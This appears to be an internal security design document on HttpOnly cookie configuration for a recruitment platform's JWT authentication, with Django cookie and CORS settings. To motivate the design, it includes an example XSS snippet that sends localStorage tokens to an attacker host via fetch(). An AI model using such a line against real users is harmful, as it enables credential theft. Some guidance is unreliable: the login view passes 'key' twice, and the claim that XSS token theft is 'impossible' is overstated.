---
type: security
title: "HTTP-Only Cookie Configuration"
date_created: 2025-05-22
date_updated: 2026-05-22
tags: [security, product/architecture]
---

## Overview

This document details the HTTP-Only cookie configuration for the recruitment SaaS platform's authentication system. Cookies are the transport mechanism for JWT tokens, chosen for their XSS-resistant properties over alternatives like `localStorage` or `sessionStorage`.

For the token design, see [[jwt-strategy|JWT Token Strategy]]. For CSRF mitigation, see [[csrf-protection|CSRF Protection Strategy]].

## Why HttpOnly Cookies?

### The XSS Threat Model

Cross-Site Scripting (XSS) attacks inject malicious JavaScript into web pages. If tokens are accessible to JavaScript (e.g., stored in `localStorage`), a single XSS vulnerability can steal all user credentials:

```javascript
// XSS attack stealing localStorage tokens
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: localStorage.getItem('access_token'),  // Accessible to any script
    refresh: localStorage.getItem('refresh_token')
  })
});
```

**HttpOnly cookies are invisible to JavaScript** — the browser includes them in requests automatically, but `document.cookie` cannot read them. This makes XSS-based token theft impossible.

### Storage Comparison

| Storage Method | XSS Vulnerable | CSRF Vulnerable | Auto-Sent | Recommended |
|---|---|---|---|---|
| HttpOnly cookie | ✗ | ✅ (mitigated) | ✅ | ✅ **Yes** |
| localStorage | ✅ **Exposed** | ✗ | ✗ | ✗ No |
| sessionStorage | ✅ **Exposed** | ✗ | ✗ | ✗ No |
| Regular cookie | ✅ **Exposed** | ✅ | ✅ | ✗ No |
| Memory (JS variable) | ✅ **Exposed** | ✗ | ✗ | ✗ No (lost on refresh) |

> **Note**: HttpOnly cookies introduce CSRF vulnerability, which is addressed by [[csrf-protection|CSRF Protection Strategy]] using the double-submit cookie pattern.

## Cookie Configuration

### Cookie Attributes

| Attribute | Value | Purpose |
|---|---|---|
| `HttpOnly` | `true` | Prevents JavaScript access (XSS mitigation) |
| `Secure` | `true` | Cookie only sent over HTTPS |
| `SameSite` | `Lax` | Prevents cross-site request inclusion (CSRF layer 1) |
| `Path` | `/` | Cookie available to all API routes |
| `Domain` | `.yourdomain.com` | Shared across subdomains (api. and app.) |
| `Max-Age` | Varies by token type | Automatic expiration |

### SameSite Attribute Details

| Value | Behavior | Use Case |
|---|---|---|
| `Strict` | Never sent cross-site | Too restrictive — breaks links from email/Slack |
| `Lax` | Sent on top-level navigation (GET only) | ✅ **Our choice** — balances security and UX |
| `None` | Always sent (requires `Secure`) | Needed only for third-party embeds |

**Why `Lax` over `Strict`**: Recruiters frequently access the platform via links in email notifications and Slack integrations. `Strict` would require re-authentication on every external link click, degrading UX significantly.

## Django Configuration

### Settings

```python
# settings.py — Cookie configuration

# ── Access Token Cookie ──
ACCESS_TOKEN_COOKIE = {
    'key': 'access_token',
    'httponly': True,
    'secure': True,                    # HTTPS only (set False for local dev)
    'samesite': 'Lax',
    'path': '/',
    'domain': '.yourdomain.com',       # Share across subdomains
    'max_age': 15 * 60,                # 15 minutes
}

# ── Refresh Token Cookie ──
REFRESH_TOKEN_COOKIE = {
    'key': 'refresh_token',
    'httponly': True,
    'secure': True,
    'samesite': 'Lax',
    'path': '/api/v1/auth/',              # Restricted path — only sent to auth endpoints
    'domain': '.yourdomain.com',
    'max_age': 7 * 24 * 60 * 60,       # 7 days
}

# ── CSRF Token Cookie ──
CSRF_COOKIE_HTTPONLY = False            # Must be readable by JavaScript
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = 'Lax'
CSRF_COOKIE_NAME = 'csrftoken'
```

### Setting Cookies in Views

```python
from django.conf import settings

class LoginView(APIView):
    def post(self, request):
        # ... authenticate user ...

        access_token = generate_access_token(user)
        refresh_token = generate_refresh_token(user)

        response = Response({'detail': 'Login successful'}, status=200)

        # Set access token cookie
        response.set_cookie(
            key='access_token',
            value=access_token,
            **settings.ACCESS_TOKEN_COOKIE
        )

        # Set refresh token cookie (restricted path)
        response.set_cookie(
            key='refresh_token',
            value=refresh_token,
            **settings.REFRESH_TOKEN_COOKIE
        )

        return response
```

## CORS Configuration for Cookie-Based Auth

Cookies are only sent cross-origin if CORS is configured to allow credentials:

```python
# settings.py — CORS configuration

INSTALLED_APPS = [
    'corsheaders',
    # ...
]

MIDDLEWARE = [
    'corsheaders.middleware.CorsMiddleware',  # Must be before CommonMiddleware
    # ...
]

# Explicit origin allowlist (no wildcards with credentials)
CORS_ALLOWED_ORIGINS = [
    'https://app.yourdomain.com',
    'https://admin.yourdomain.com',
]

# Development origins
if DEBUG:
    CORS_ALLOWED_ORIGINS += [
        'http://localhost:3000',
        'http://localhost:5173',
    ]

CORS_ALLOW_CREDENTIALS = True  # Required for cookies to be sent cross-origin

# IMPORTANT: CORS_ALLOW_ALL_ORIGINS must be False when using credentials
CORS_ALLOW_ALL_ORIGINS = False
```

> **Warning**: Setting `CORS_ALLOW_ALL_ORIGINS = True` with `CORS_ALLOW_CREDENTIALS = True` is a critical security vulnerability. Browsers will block this combination, but misconfigurations can expose tokens.

## Cross-Domain Considerations

### Same-Domain Setup (Recommended)

| Service | URL | Cookie Domain |
|---|---|---|
| Frontend | `https://app.yourdomain.com` | `.yourdomain.com` |
| API | `https://api.yourdomain.com` | `.yourdomain.com` |

Using a shared parent domain (`.yourdomain.com`) allows cookies to be shared across subdomains without complex CORS configuration.

### Multi-Domain Setup (If Needed)

If the frontend and API are on different root domains, additional configuration is required:

- `SameSite=None` (cookies sent cross-site, requires `Secure`)
- Explicit `CORS_ALLOWED_ORIGINS` for each frontend domain
- Additional CSRF configuration (see [[csrf-protection|CSRF Protection Strategy]])

> **Recommendation**: Avoid multi-domain setups. Use subdomains under a shared root domain to simplify cookie and CORS management.

## Local Development

```python
# settings/local.py — Development overrides

if DEBUG:
    # Allow non-HTTPS cookies in development
    SESSION_COOKIE_SECURE = False
    CSRF_COOKIE_SECURE = False
    ACCESS_TOKEN_COOKIE['secure'] = False
    REFRESH_TOKEN_COOKIE['secure'] = False

    # Local domain
    ACCESS_TOKEN_COOKIE['domain'] = 'localhost'
    REFRESH_TOKEN_COOKIE['domain'] = 'localhost'
```

## Related Documents

- [[jwt-strategy|JWT Token Strategy]]
- [[csrf-protection|CSRF Protection Strategy]]
- [[authentication-flow|Authentication Flow]]
- [[ADR-005-auth-strategy|ADR-005 — Authentication Strategy]]
- [[rate-limiting|API Rate Limiting]]
